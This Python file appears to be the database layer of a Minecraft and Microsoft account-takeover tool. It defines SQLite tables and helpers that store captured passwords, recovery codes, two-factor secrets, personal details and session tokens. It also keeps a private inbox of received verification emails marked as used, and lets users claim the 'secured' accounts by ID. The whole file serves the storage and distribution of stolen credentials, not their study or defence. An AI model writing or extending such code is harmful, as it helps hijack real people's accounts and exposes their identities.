import sqlite3

class DBConnection:
    def __init__(self) -> None:
        self.conn = sqlite3.connect("database/database.db", check_same_thread=False)
        self.cursor = self.conn.cursor()

    def __enter__(self):
        return self
    
    def __exit__(self, *args) -> None:
        self.conn.close()

    def setupTables(self) -> None:
        self.cursor.executescript("""
            CREATE TABLE IF NOT EXISTS `security_emails` (
                email TEXT,
                password TEXT
            );

            CREATE TABLE IF NOT EXISTS `blacklisted_users` (
                id INTEGER UNIQUE
            );

            CREATE TABLE IF NOT EXISTS `claimed_accounts` (
                claim_id TEXT UNIQUE,
                claimed_by INTEGER
            );

            CREATE TABLE IF NOT EXISTS `secured_accounts` (
                claim_id TEXT UNIQUE,
                claimed_by INTEGER,
                ms_email TEXT,
                ms_security_email TEXT,
                ms_password TEXT,
                ms_recovery_code TEXT,
                ms_auth_secret TEXT,
                ms_first_name TEXT,
                ms_last_name TEXT,
                ms_full_name TEXT,
                ms_region TEXT,
                ms_birthday TEXT,
                mc_name TEXT,
                mc_method TEXT,
                mc_gamertag TEXT,
                mc_uchange TEXT,
                mc_capes TEXT,
                mc_ssid TEXT,
                secured_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            );

            CREATE TABLE IF NOT EXISTS `received_emails` (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                to_address TEXT,
                from_address TEXT,
                subject TEXT,
                body TEXT,
                received_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                consumed INTEGER DEFAULT 0
            );
        """)
        self.conn.commit()

    # Security Emails
    def addSecurityEmail(self, email: str, pwd: str) -> None:
        self.cursor.execute("""
            INSERT INTO `security_emails` (email, password)
            VALUES (?, ?)
        """, (email, pwd)
        )

        self.conn.commit()

    def getEmailPassword(self, email: str) -> str | None:
        password = self.cursor.execute("""
            SELECT password FROM `security_emails`
            WHERE email = ?
        """, (email,)
        ).fetchone()

        return password
    
    def getSecurityEmails(self) -> tuple:
        emails = self.cursor.execute("""
            SELECT email FROM `security_emails`
        """).fetchall()

        return emails

    # Received Emails (custom SMTP)
    def addEmail(self, to_address: str, from_address: str, subject: str, body: str) -> None:
        self.cursor.execute("""
            INSERT INTO `received_emails` (to_address, from_address, subject, body)
            VALUES (?, ?, ?, ?)
        """, (to_address, from_address, subject, body))
        self.conn.commit()

    def getEmails(self, to_address: str) -> list:
        return self.cursor.execute("""
            SELECT id, to_address, from_address, subject, body, received_at
            FROM `received_emails`
            WHERE to_address = ?
            ORDER BY received_at ASC
        """, (to_address.lower(),)).fetchall()

    def markUnused(self, to_address: str) -> tuple | None:
        return self.cursor.execute("""
            SELECT id, body FROM `received_emails`
            WHERE to_address = ? AND consumed = 0
            ORDER BY received_at ASC
            LIMIT 1
        """, (to_address.lower(),)).fetchone()

    def markUsed(self, email_id: int) -> None:
        self.cursor.execute("""
            UPDATE `received_emails` SET consumed = 1 WHERE id = ?
        """, (email_id,))
        self.conn.commit()

    # Blacklisting
    def getBlacklistedUsers(self) -> list:
        users = self.cursor.execute("""
            SELECT id FROM `blacklisted_users`
        """).fetchall()

        return [user_id for (user_id,) in users]
    
    def addBlacklistedUser(self, id: int) -> None:
        self.cursor.execute("""
            INSERT OR IGNORE INTO `blacklisted_users` (id)
            VALUES (?)
        """, (id,))
        self.conn.commit()

    def removeBlacklistedUser(self, id: int) -> None:
        self.cursor.execute("""
            DELETE FROM `blacklisted_users`
            WHERE id = ?
        """, (id,))
        self.conn.commit()

    # Secured Accounts
    def addSecuredAccount(self, claim_id: str, account: dict) -> None:
        ms = account["microsoft"]
        mc = account["minecraft"]
        self.cursor.execute("""
            INSERT INTO `secured_accounts` (
                claim_id, claimed_by,
                ms_email, ms_security_email, ms_password, ms_recovery_code, ms_auth_secret,
                ms_first_name, ms_last_name, ms_full_name, ms_region, ms_birthday,
                mc_name, mc_method, mc_gamertag, mc_uchange, mc_capes, mc_ssid
            ) VALUES (?, NULL, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
        """, (
            claim_id,
            ms["email"], ms["security_email"], ms["password"], ms["recovery_code"], ms["auth_secret"],
            ms["firstName"], ms["lastName"], ms["fullName"], ms["region"], ms["birthday"],
            mc["name"], mc["method"], mc["gamertag"], mc["uchange"], mc["capes"], str(mc["SSID"])
        ))
        self.conn.commit()

    def isValidClaimId(self, claim_id: str) -> bool:
        result = self.cursor.execute("""
            SELECT 1 FROM `secured_accounts` WHERE claim_id = ?
        """, (claim_id,)).fetchone()
        return result is not None

    def isAlreadyClaimed(self, claim_id: str) -> bool:
        result = self.cursor.execute("""
            SELECT 1 FROM `secured_accounts`
            WHERE claim_id = ? AND claimed_by IS NOT NULL
        """, (claim_id,)).fetchone()
        return result is not None

    def claimAccount(self, claim_id: str, user_id: int) -> None:
        self.cursor.execute("""
            UPDATE `secured_accounts`
            SET claimed_by = ?
            WHERE claim_id = ? AND claimed_by IS NULL
        """, (user_id, claim_id))
        self.conn.commit()
